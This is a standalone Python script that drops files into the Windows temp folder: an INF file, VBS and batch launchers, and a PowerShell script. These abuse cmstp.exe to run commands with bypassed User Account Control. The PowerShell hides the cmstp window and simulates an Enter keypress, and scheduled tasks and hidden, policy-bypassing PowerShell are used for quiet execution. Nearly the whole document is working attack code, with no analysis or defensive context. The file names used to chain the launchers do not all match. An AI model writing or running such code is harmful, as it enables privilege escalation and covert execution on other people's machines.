import os
import subprocess
import time
import sys

def run_command(command, wait=True):
    result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout = result.stdout.decode(errors='replace')
    stderr = result.stderr.decode(errors='replace')
    return result.returncode, stdout, stderr

def create_inf_file():
    temp_folder = os.getenv('TEMP')
    inf_content = f"""
    [version]
    Signature="$Windows NT$"
    AdvancedINF=2.5

    [DefaultInstall]
    CustomDestination=CustInstDestSectionAllUsers
    RunPreSetupCommands=RunPreSetupCommandsSection

    [RunPreSetupCommandsSection]
    taskkill /IM cmstp.exe /F
    cmd /c start {temp_folder}\\ddd.vbs

    [CustInstDestSectionAllUsers]
    49000,49001=AllUser_LDIDSection,7

    [AllUser_LDIDSection]
    "HKLM", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""

    [Strings]
    ServiceName="CorpVPN"
    ShortSvcName="CorpVPN"
    """

    inf_file_path = os.path.join(temp_folder, 'corpvpn.inf')
    with open(inf_file_path, 'w') as f:
        f.write(inf_content)

    return inf_file_path

def create_zzz_bat():
    temp_folder = os.getenv('TEMP')
    vbs_content2 = f'''powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File a.ps1" '''
    vbs_path2 = os.path.join(temp_folder, "zzz.bat")
    with open(vbs_path2, 'w') as f:
        f.write(vbs_content2)
    return vbs_path2


def create_zzz_vbs():
    temp_folder = os.getenv('TEMP')
    exe_path = os.path.join(temp_folder, "zzz.bat")
    vbs_content = f'''Set WshShell = CreateObject("WScript.Shell")
WshShell.Run Chr(34) & "{exe_path}" & Chr(34), 0
Set WshShell = Nothing'''
    vbs_path = os.path.join(temp_folder, "zzz.vbs")
    with open(vbs_path, 'w') as f:
        f.write(vbs_content)
    return vbs_path

def create_a_ps1():
    ps_code = '''
# PowerShell script content
$InfFile = "$env:TEMP\\corpvpn.inf"

Function Get-Hwnd {
    [CmdletBinding()]
    Param ([string] $ProcessName)
    Process {
        Try {
            $hwnd = Get-Process -Name $ProcessName | Select-Object -ExpandProperty MainWindowHandle
        } Catch {
            $hwnd = $null
        }
        New-Object -TypeName PsObject -Property @{ ProcessName = $ProcessName; Hwnd = $hwnd }
    }
}

function Set-WindowActive {
    [CmdletBinding()]
    Param ([string] $Name)
    Process {
        $memberDefinition = @'
        [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        [DllImport("user32.dll", SetLastError = true)] public static extern bool SetForegroundWindow(IntPtr hWnd);
'@
        Add-Type -MemberDefinition $memberDefinition -Name Api -Namespace User32
        $hwnd = Get-Hwnd -ProcessName $Name | Select-Object -ExpandProperty Hwnd
        If ($hwnd) {
            [User32.Api]::SetForegroundWindow($hwnd)
            [User32.Api]::ShowWindow($hwnd, 0)
        }
        New-Object -TypeName PsObject -Property @{ Process = $Name; Hwnd = $hwnd }
    }
}

Add-Type -AssemblyName System.Windows.Forms
$ps = New-Object System.Diagnostics.ProcessStartInfo "c:\\windows\\system32\\cmstp.exe"
$ps.Arguments = "/au $InfFile"
$ps.UseShellExecute = $false
$ps.CreateNoWindow = $true
[System.Diagnostics.Process]::Start($ps) | Out-Null

do {} until ((Set-WindowActive cmstp).Hwnd -ne 0)
Set-WindowActive cmstp
[System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
'''
    temp_folder = os.getenv('TEMP')
    a_ps1_path = os.path.join(temp_folder, 'a.ps1')
    with open(a_ps1_path, 'w') as f:
        f.write(ps_code)
    return a_ps1_path

def main():
    run_command('schtasks /delete /tn "InstallRequests" /f')
    run_command('schtasks /delete /tn "RunPowerShellScript" /f')

    returncode, stdout, stderr = run_command("python --version")
    if returncode != 0:
        returncode, stdout, stderr = run_command('first.exe /quiet InstallAllUsers=0 PrependPath=1')
        if returncode != 0:
            sys.exit(1)

    temp_dir = os.getenv('TEMP')
    script_path = os.path.join(temp_dir, 'install_requests.py')
    with open(script_path, 'w') as script_file:
        script_file.write("import subprocess\n")
        script_file.write("subprocess.check_call(['python', '-m', 'pip', 'install', 'requests'])\n")

    returncode, stdout, stderr = run_command(f'schtasks /create /tn "InstallRequests" /tr "python {script_path}" /sc once /st 00:00 /f')
    if returncode != 0:
        print(f"Failed to create task 'InstallRequests': {stderr}")
        sys.exit(1)
    run_command('schtasks /run /tn "InstallRequests"')

    time.sleep(10)
    os.remove(script_path)

    a_ps1_path = create_a_ps1()
    zzz_vbs_path = create_zzz_vbs()
    zzz_bat_path = create_zzz_bat()

    # if os.path.exists(a_ps1_path):
    #     returncode, stdout, stderr = run_command(f'schtasks /create /tn "RunPowerShellScript" /tr "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File {a_ps1_path}" /sc once /st 00:00 /f')
    #     if returncode != 0:
    #         print(f"Failed to create task 'RunPowerShellScript': {stderr}")
    #         sys.exit(1)
    #     run_command('schtasks /run /tn "RunPowerShellScript"')
    # else:
    #     print("PowerShell script file does not exist.")

    create_inf_file()

if __name__ == "__main__":
    main()
